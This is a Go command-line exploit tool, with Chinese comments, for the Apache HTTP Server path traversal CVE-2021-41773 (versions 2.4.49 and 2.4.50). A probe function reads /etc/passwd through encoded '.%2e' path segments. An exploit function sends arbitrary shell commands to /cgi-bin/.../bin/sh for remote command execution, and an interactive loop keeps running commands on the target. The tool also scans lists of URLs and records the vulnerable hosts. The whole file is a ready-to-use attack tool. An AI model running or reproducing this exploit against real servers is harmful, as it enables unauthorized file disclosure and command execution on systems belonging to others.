package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func usage() {
	fmt.Fprintf(os.Stderr, `apache路径穿越漏洞--cve-2021-41773； 影响version: Apache HTTP Server 2.4.49、2.4.50
Usage: 	./main -u <url>
	./main -u <url> -c <command>
	./main -f <file>
	./main -f <file> -o <file>
	./main -u <url> -cmd

Options:
`)
	flag.PrintDefaults()
}

// url处理
func urlHandler(target string) string {
	// 没有http前缀的添加http前缀
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	// 删除路径部分
	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("解析URL失败:", err)
		return target
	}
	targetURL.Path = ""
	target = targetURL.String()

	// 结尾有 / 的就去掉
	if strings.HasSuffix(target, "/") {
		// 去掉后缀 /
		target = strings.TrimSuffix(target, "/")
		fmt.Println(target)
	}
	return target
}

// getStatusCode 获取url状态码
func getStatusCode(url string) int {
	resp, err := http.Get(url)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

// 读文件
func readFile(filePath string) ([]string, error) {
	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// 检测是否为200
func StatusCode(target string) bool {
	resp, err := http.Get(target)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return true
	}
	return false
}

// 漏洞验证：
func poc(target string) bool {
	vulurl := target + "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	req, _ := http.NewRequest("GET", vulurl, nil)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("target： %s 访问错误\n", target)
		return false
	}
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)

	file := string(body)
	if strings.Contains(string(body), "root:x") {
		fmt.Println(file)
		return true
	}

	return false
}

// 漏洞利用
func exp(target string, command string) {
	vulurl := target + "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
	data := `echo; ` + command
	req, _ := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(data)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	client := http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)

	res := strings.Replace(string(body), "执行错误", "", -1)
	res = strings.TrimSpace(res)
	fmt.Println(res)
}

func main() {
	var (
		url     string
		file    string
		output  string
		command string
		cmd     bool
		h       bool
	)

	flag.StringVar(&url, "u", "", "url,单个URL")
	flag.StringVar(&file, "f", "", "file,url.txt,URL文件")
	flag.StringVar(&output, "o", "", "output，ok.txt,将存在漏洞的导出到文件")
	flag.StringVar(&command, "c", "", "command,执行命令")
	flag.BoolVar(&cmd, "cmd", false, "command,循环执行命令")
	flag.BoolVar(&h, "h", false, "this help")
	flag.Parse()

	if h {
		usage()
	}

	if url == "" && file == "" {
		usage()
		fmt.Println("请指定URL或URL文件")
		return
	}
	if url != "" && file != "" {
		usage()
		fmt.Println("URL和URL文件只能选择其中一个")
		return
	}
	if output != "" && file == "" {
		usage()
		fmt.Println("输出文件参数-o只能与URL文件参数-f一起使用")
		return
	}
	if command != "" && url == "" {
		usage()
		fmt.Println("命令参数-c只能与单个URL参数-u一起使用")
		return
	}

	// 单个url
	target := urlHandler(url)
	if poc(target) {
		fmt.Printf("target： %s 存在漏洞\n", target)
		// -c执行单个命令
		if command != "" {
			exp(target, command)
		}
		// 循环执行命令
		if url != "" && cmd {
			for {
				fmt.Printf("\n\ncmd:")
				fmt.Scanln(&command)
				if command != "" {
					exp(target, command)
				}
			}
		}
	} else {
		fmt.Printf("target： %s 不存在漏洞\n", target)
	}

	// URL文件&输出
	if file != "" {
		filewrite, err := os.OpenFile(output, os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			fmt.Println(err)
		}
		lines, err := readFile(file)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, line := range lines {
			target := urlHandler(line)
			statusCode := getStatusCode(target)
			if statusCode == -1 {
				fmt.Println("无法访问URL:", target)
				continue
			} else if statusCode != 200 {
				fmt.Println("URL访问失败:", target, ", 状态码:", statusCode)
				continue
			}
			if poc(target) {
				fmt.Printf("target： %s 存在漏洞\n", target)
				filewrite.WriteString(target + "\n")
			} else {
				fmt.Printf("target： %s 不存在漏洞\n", target)
				continue
			}
		}
	}
}
